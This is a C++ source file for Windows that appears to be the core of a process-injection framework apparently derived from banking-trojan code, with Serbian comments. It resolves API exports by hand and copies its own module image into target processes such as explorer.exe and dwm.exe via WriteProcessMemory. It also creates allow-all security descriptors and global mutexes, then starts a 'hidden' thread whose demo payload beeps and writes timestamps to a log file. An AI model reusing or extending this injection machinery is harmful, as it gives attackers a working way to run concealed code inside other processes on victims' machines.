#include<WinSock2.h>
#include<WTypes.h>
#include<WinInet.h>
#include<ShlObj.h>
#include<Shlwapi.h>
#include"defines.h"

#include "config.h"
#include "debug.h"
#include "core.h"
#include "mem.h"
#include "str.h"
#include "peimage.h"
#include "process.h"
#include "winsecurity.h"
#include "fs.h"
#include "sync.h"
#include "winsecurity.h"

COREDATA coreData;

////////////////////////////////////////////////////////////////////////////////////////////////////
// Process list.
////////////////////////////////////////////////////////////////////////////////////////////////////

typedef struct
{
  WCHAR nameStr[128]; //The name of the process, can keep the mask if folder == CSIDL_DESKTOP.
  DWORD rights; //Rights CDPF_RIGHT_*.
  DWORD folder; //Folder of the process CSIDL_. If the folder == CSIDL_DESKTOP, folder can be any.
}
PROCESSRIGHTS;

//!!! CODE with CSIDL_DESKTOP not active!
const static PROCESSRIGHTS processRights[] =
{
  //Processes that are present throughout all of the user's session.
	{L"dwm.exe",      Core::CDPF_RIGHT_CONTROL, CSIDL_SYSTEM},
  {L"taskhost.exe", Core::CDPF_RIGHT_CONTROL, CSIDL_SYSTEM},
	{L"taskeng.exe",  Core::CDPF_RIGHT_CONTROL, CSIDL_SYSTEM},
	{L"wscntfy.exe",  Core::CDPF_RIGHT_CONTROL, CSIDL_SYSTEM},
  {L"ctfmon.exe",   Core::CDPF_RIGHT_CONTROL, CSIDL_SYSTEM},
	{L"rdpclip.exe",  Core::CDPF_RIGHT_CONTROL, CSIDL_SYSTEM},
	{L"explorer.exe", Core::CDPF_RIGHT_CONTROL, CSIDL_WINDOWS},
};

////////////////////////////////////////////////////////////////////////////////////////////////////
// Debug.
////////////////////////////////////////////////////////////////////////////////////////////////////


/*
  Analog to CWA(kernel32, GetProcAddress).
*/
static void *__GetProcAddress(HMODULE module, LPSTR name)
{
#if defined _WIN64
  PIMAGE_NT_HEADERS64 ntHeaders  = (PIMAGE_NT_HEADERS64)((LPBYTE)module + ((PIMAGE_DOS_HEADER)module)->e_lfanew);
#else
  PIMAGE_NT_HEADERS32 ntHeaders  = (PIMAGE_NT_HEADERS32)((LPBYTE)module + ((PIMAGE_DOS_HEADER)module)->e_lfanew);
#endif
  PIMAGE_DATA_DIRECTORY impDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
  PIMAGE_EXPORT_DIRECTORY ied =  (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)module + impDir->VirtualAddress);

  for(DWORD i = 0; i < ied->NumberOfNames; i++)
  {
    LPDWORD curName = (LPDWORD)(((LPBYTE)module) + ied->AddressOfNames + i * sizeof(DWORD));
    if(curName && Str::_CompareA(name, (LPSTR)((LPBYTE)module + *curName), -1, -1) == 0)
    {
      LPWORD pw = (LPWORD)(((LPBYTE)module) + ied->AddressOfNameOrdinals + i * sizeof(WORD));
      curName = (LPDWORD)(((LPBYTE)module) + ied->AddressOfFunctions + (*pw) * sizeof(DWORD));
      return ((LPBYTE)module + *curName);
    }
  }

  return NULL;
}

/*
  Copying the module data into another process.

  IN process  - process to modify.
  IN image    - the address of the module in the process.
  IN curVa    - current VA data to be copied.
  IN data     - data.
  IN dataSize - data size to copy.

  Return      - true - in case of success,
                false - in case of error.
*/
static bool copyDataToProcess(HANDLE process, void *image, void *curVa, void *data, DWORD dataSize)
{
	DWORD_PTR rva = (DWORD_PTR)(((LPBYTE)curVa) - ((LPBYTE)coreData.modules.current));
	return (CWA(kernel32, WriteProcessMemory)(process, (LPBYTE)image + rva, data, dataSize, NULL) == FALSE) ? false : true;
}

////////////////////////////////////////////////////////////////////////////////////////////////////
// Core.
////////////////////////////////////////////////////////////////////////////////////////////////////


/*
  Load modules and functions.

  IN flags - flags INITF_*.

  Return   - true - in case of success,
             false - in case of error.
*/
static bool __inline initLoadModules(DWORD flags)
{
  if((coreData.modules.kernel32 = Process::_getKernel32Handle()) == NULL)
  {
    WDEBUG0(WDDT_ERROR, "_getKernel32Handle() failed.");
    return false;
  }
	if((flags & Core::INITF_INJECT_START) == 0)
	{
		if((coreData.modules.current = CWA(kernel32, GetModuleHandleW)(NULL)) == NULL)return false;
	}
	else
	{
		//Update imports.
		if(!PeImage::_loadImport(coreData.modules.current, __GetProcAddress(coreData.modules.kernel32, "LoadLibraryA"), __GetProcAddress(coreData.modules.kernel32, "GetProcAddress")))return false;
	}

	return true;
}

/*
  Basic OS data.

  IN flags - flags INITF_*.

  Return   - true - in case of success,
             false - in case of error.
*/
static bool __inline initOsBasic(DWORD flags)
{
  //WOW64
# if !defined _WIN64
  if((flags & Core::INITF_INJECT_START) == 0 && Process::_isWow64(CURRENT_PROCESS))coreData.proccessFlags |= Core::CDPF_WOW64;
# endif
  
  //Obtain the descriptor for access.
  if((coreData.securityAttributes.buf = WinSecurity::_getFullAccessDescriptors(&coreData.securityAttributes.saAllowAll, &coreData.securityAttributes.sdAllowAll)) == NULL)
  {
    WDEBUG0(WDDT_ERROR, "GetFullAccessDescriptors failed.");
    return false;
  }

  //Retrieving IntegrityLevel.
  if((coreData.integrityLevel = Process::_getIntegrityLevel(CURRENT_PROCESS)) == Process::INTEGRITY_UNKNOWN)
  {
		//WinXP case
    coreData.integrityLevel = Process::INTEGRITY_MEDIUM;
  }
  if((flags & Core::INITF_INJECT_START) == 0 && coreData.integrityLevel < Process::INTEGRITY_MEDIUM)
  {
    WDEBUG0(WDDT_ERROR, "Bad integrity level for normal startup.");
    return false;
  }
  
  return true;
}

/*
  Current user's data.

  IN flags - flags INITF_*.

  Return   - true - in case of success,
             false - in case of error.
*/
static bool __inline initUserData(DWORD flags)
{
	if((coreData.currentUser.token = Process::_getUserByProcessHandle(CURRENT_PROCESS, &coreData.currentUser.sessionId)))
	{
		coreData.currentUser.sidLength = CWA(advapi32, GetLengthSid)(coreData.currentUser.token->User.Sid);
		WDEBUG1(WDDT_INFO, "coreData.currentUser.sessionId=\"%u\"", coreData.currentUser.sessionId);
	}
	else 
	{
		WDEBUG0(WDDT_ERROR, "Process::_getProcessUserByHandle failed!");
		return false;
	}

	return true;
}
/*
  Getting the path.

  IN flags - flags INITF_*.

  Return   - true - in case of success,
             false - in case of error.
*/
static bool __inline initPaths(DWORD flags)
{
  WCHAR path[MAX_PATH];

  //Current file.
  DWORD size = CWA(kernel32, GetModuleFileNameW)(NULL, path, MAX_PATH);
  if((coreData.paths.process = Str::_CopyExW(path, size)) == NULL)
  {
    WDEBUG0(WDDT_ERROR, "Not enough memory.");
    return false;
  }
  
  return true;
}

/*
  Retrieving the process rights CDPF_RIGHT_*.

  IN flags - flags INITF_*.

  Return   - true - in case of success,
             false - in case of error.
*/
static bool __inline initProcessRights(DWORD flags)
{
  if(flags & Core::INITF_INJECT_START)
  {
    if(coreData.integrityLevel > Process::INTEGRITY_LOW)
    {
      //LPWSTR fileName = NULL;
      WCHAR path[MAX_PATH];
      WCHAR *name;

      for(DWORD i = 0; i < sizeof(processRights) / sizeof(PROCESSRIGHTS); i++)
      {
        name=(WCHAR *)processRights[i].nameStr;
#       if(0)
        if(processRights[i].folder == CSIDL_DESKTOP)
        {
          if(fileName == NULL)fileName = CWA(shlwapi, PathFindFileNameW)(coreData.paths.process);
          if(CWA(shlwapi, PathMatchSpecW)(fileName, name) == TRUE)
          {
            WDEBUG1(WDDT_INFO, "Rights detected as %s.", name);
            coreData.proccessFlags |= processRights[i].rights;
            break;
          }
        }
        else
#       endif
        {
          if(CWA(shell32, SHGetFolderPathW)(NULL, processRights[i].folder, NULL, SHGFP_TYPE_CURRENT, path) == S_OK &&
            Fs::_pathCombine(path, path, name) &&
            CWA(kernel32, lstrcmpiW)(path, coreData.paths.process) == 0)
          {
            WDEBUG1(WDDT_INFO, "Rights detected as %s.", name);
            coreData.proccessFlags |= processRights[i].rights;
            break;
          }
        }
      }
    }
  }
#if !defined _WIN64
  else if(coreData.proccessFlags & Core::CDPF_WOW64)coreData.proccessFlags |= Core::CDPF_RIGHT_ALL;
#endif

  return true;
}

////////////////////////////////////////////////////////////////////////////////////////////////////

bool Core::init(DWORD flags)
{
  if((flags & INITF_INJECT_START) == 0)coreData.proccessFlags = 0;
  //else coreData.proccessFlags = 0; //updated parent.

  //obtain the handles of the main modules (dll).
  if(!initLoadModules(flags))return false;

  //init basic process information
  Process::init();

  //Initialize the basic modules.
  Mem::init(512 * 1024);
  
  //Preparing to output debugging information.
# if(BO_DEBUG > 0)
  {
    DebugClient::Init();
#   if(BO_DEBUG == 1)  
    CWA(user32, MessageBeep)(-1);
#   elif(BO_DEBUG == 2)
    debugServer = NULL;  
    if((flags & INITF_INJECT_START) == 0)
    {
			debugServer = CWA(kernel32, CreateThread)(NULL, 0, debugServerProc, NULL, 0, NULL); 
    }
#   endif
  }
# endif


  //Basic OS data.
  if(!initOsBasic(flags))return false;

  //Current user's data.
  if(!initUserData(flags))return false;

  //retrieve home directory.
  if(!initPaths(flags))return false;
  
  //PID
  coreData.pid = CWA(kernel32,GetCurrentProcessId)();

  //Set the process rights.
  if(!initProcessRights(flags))return false;

  //Initialize additional modules.

  //Print the information about the process.
# if(BO_DEBUG > 0)
  {
    LPWSTR userSid;
		//if(CWA(kernel32, ConvertSidToStringSidW)(coreData.currentUser.token->User.Sid, &userSid) == FALSE)userSid = NULL;
		userSid = NULL;

    WDEBUG5(WDDT_INFO, "Initialized successfully:\r\nIntegrity level: %u\r\ncoreData.proccessFlags: 0x%08X\r\nFull path: %s\r\nCommand line: %s\r\nSID: %s\r\n",
                       coreData.integrityLevel,
                       coreData.proccessFlags,
                       coreData.paths.process,
                       CWA(kernel32, GetCommandLineW)(),
                       userSid == NULL ? L"-" : userSid);

    if(userSid != NULL)CWA(kernel32, LocalFree)(userSid);
  }
# endif
  
  return true;
}

HANDLE Core::createMutexOfProcess(DWORD pid)
{
	// koristicemo Global mutex umesto Local
	WCHAR objectName[]=L"Global\\{75404F64-9D98-41E4-8759-5A4FA65D16EF}";

	return Sync::_createUniqueMutex(&coreData.securityAttributes.saAllowAll, objectName);
}

void *Core::initNewModule(HANDLE process, HANDLE processMutex, DWORD proccessFlags)
{
	IMAGE_DATA_DIRECTORY relocsDir;
	relocsDir.VirtualAddress=0xFFFFFFFF;
	relocsDir.Size=0x0c00;

	void *image = PeImage::_copyModuleToProcess(process, coreData.modules.current);

  if(image == NULL)
  {	  
		WDEBUG0(WDDT_ERROR, "Failed _copyModuleToProcess.");
	  return NULL;
  }
	WDEBUG0(WDDT_INFO, "OK: _copyModuleToProcess.");

  BYTE errorsCount = 0;
  
  //Duplicate the mutex of the new process into the new process.
  {
    HANDLE newMutex;
    if(CWA(kernel32, DuplicateHandle)(CURRENT_PROCESS, processMutex, process, &newMutex, 0, FALSE, DUPLICATE_SAME_ACCESS) == FALSE)
    {
      WDEBUG0(WDDT_ERROR, "Failed to duplicate mutex of process.");
      errorsCount++;
    }
		else
		{
			WDEBUG0(WDDT_INFO, "OK: DuplicateHandle.");
		}
  }
  
  //coreData.proccessFlags.
  proccessFlags |= (coreData.proccessFlags & CDPT_INHERITABLE_MASK);
  if(!copyDataToProcess(process, image, &coreData.proccessFlags, &proccessFlags, sizeof(DWORD)))
  {
    WDEBUG0(WDDT_ERROR, "Failed coreData.proccessFlags.");
    errorsCount++;
  }
	else
	{
		WDEBUG0(WDDT_INFO, "OK: copyDataToProcess:coreData.proccessFlags.");
	}

  //Specify the current module.
  if(!copyDataToProcess(process, image, &coreData.modules.current, &image, sizeof(HMODULE)))
  {
    WDEBUG0(WDDT_ERROR, "Failed coreData.modules.current.");
    errorsCount++;
  }
	{
		WDEBUG0(WDDT_INFO, "OK: copyDataToProcess:coreData.modules.current.");
	}

  //Error outputs.
  if(errorsCount != 0)
  {
		CWA(kernel32, VirtualFreeEx)(process, image, 0, MEM_RELEASE);
    return NULL;
  }
  
  //successful entry.
  return image;
}


////////////////////////////////////////////////////////////////////////////////////////////////////
// promenljive za log file
////////////////////////////////////////////////////////////////////////////////////////////////////
static SECURITY_ATTRIBUTES saFullAccess;
static SECURITY_DESCRIPTOR sdFullAccess;
static bool SecurityOK;
static WCHAR __outputFile[MAX_PATH];
static DWORD integrityLevel;
#define LOG_FILE_W        L"C:\\process-output.txt"
#define MUTEX_WRITEFILE L"{8FBD7693-E245-4674-8C7B-BBC30B3E11C9}"
#include <accCtrl.h>		// definicija za SE_FILE_OBJECT

static HANDLE OpenOutputFile(void)
{
	WinSecurity::_setLowIntegrityLevelLabel(__outputFile, SE_FILE_OBJECT, false);
	HANDLE file = CWA(kernel32, CreateFileW)(__outputFile, GENERIC_WRITE | WRITE_DAC, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	//Write BOM
	if(file != INVALID_HANDLE_VALUE)
	{
		LARGE_INTEGER li;
		if(CWA(kernel32, GetFileSizeEx)(file, &li) && li.HighPart == 0 && li.LowPart == 0)
		{
			DWORD dws = UTF8_BOM;
			CWA(kernel32, WriteFile)(file, &dws, UTF8_BOM_SIZE, &li.LowPart, NULL);
		}
	}

	return file;
}

static DWORD WINAPI hiddenThreadRoutine(void *)
//static void hiddenThreadRoutine(void)
{
	int i;
	for(i=0;i<10;i++)
	{
		//beep
		CWA(user32, MessageBeep)(-1);
		
		// pisanje u fajl
		HANDLE hMutex = Sync::_waitForMutex(SecurityOK ? &saFullAccess : NULL, MUTEX_WRITEFILE);
		if(hMutex)
		{
			Str::UTF8STRING u8str;

			SYSTEMTIME lt;
			CWA(kernel32, GetLocalTime)(&lt);
			
			CHAR pTmpBuffer[512];
			int iSize = Str::_sprintfA((LPSTR)&pTmpBuffer, 250,
				"[%02u:%02u:%02u] Pisem ...", lt.wHour, lt.wMinute, lt.wSecond);

			u8str.data   = (void *)pTmpBuffer;
			u8str.length = iSize;
			u8str.size   = iSize;
			
			DWORD dwSize;
			HANDLE hFile = OpenOutputFile();
			if(hFile != INVALID_HANDLE_VALUE)
			{
				if(CWA(kernel32, SetFilePointer)(hFile, 0, NULL, FILE_END) != INVALID_SET_FILE_POINTER)
				{
					CWA(kernel32, WriteFile)(hFile, u8str.data, u8str.size, &dwSize, 0);
					CWA(kernel32, WriteFile)(hFile, "\r\n\r\n", 4, &dwSize, 0);
				}
				CWA(kernel32, CloseHandle)(hFile);
			}
			
			Sync::_freeMutex(hMutex);
		}
		
		// sleep 5000msec
		CWA(kernel32, Sleep)(5000);
	}
	return 0;
}

static bool defaultModuleEntry(void)
{

	// inicijalizujemo log file
	SecurityOK = WinSecurity::_getFullAccessDescriptors(&saFullAccess, &sdFullAccess);

	integrityLevel = Process::_getIntegrityLevel(CURRENT_PROCESS);
	if(integrityLevel == Process::INTEGRITY_UNKNOWN || integrityLevel == Process::INTEGRITY_HIGH)
	{
		Str::_CopyW(__outputFile, LOG_FILE_W, -1);
	}
	else
	{
		// kreiraj fajl na desktop-u
		__outputFile[0] = 0;
		CWA(shell32, SHGetFolderPathW)(NULL, CSIDL_DESKTOP, NULL, SHGFP_TYPE_CURRENT, __outputFile);
		Fs::_pathCombine(__outputFile, __outputFile, LOG_FILE_W);
	}

	// pokrenemo drugi thread koji ce raditi sakriven
	CWA(kernel32, CreateThread)(NULL, 0, hiddenThreadRoutine, NULL, 0, NULL);

	return true;
}

DWORD WINAPI Core::_injectEntryForThreadEntry(void *)
{
  defaultModuleEntry();
  return 0;
}
